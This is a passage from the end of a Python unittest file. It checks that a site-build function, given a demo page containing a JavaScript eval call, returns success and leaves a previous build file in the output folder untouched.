        tmp, root = make_repo(["js-demos/a/index.html"],
                              {"js-demos/a/index.html": PAGE.format(t="A", js="eval(code)")})
        self.addCleanup(tmp.cleanup)
        out = root / "_site"
        out.mkdir()
        (out / "keep.txt").write_text("previous build", encoding="utf-8")
        self.assertTrue(build_site.build(root, out))
        self.assertEqual([p.name for p in out.iterdir()], ["keep.txt"])
        self.assertEqual((out / "keep.txt").read_text(encoding="utf-8"), "previous build")


if __name__ == "__main__":
    unittest.main()
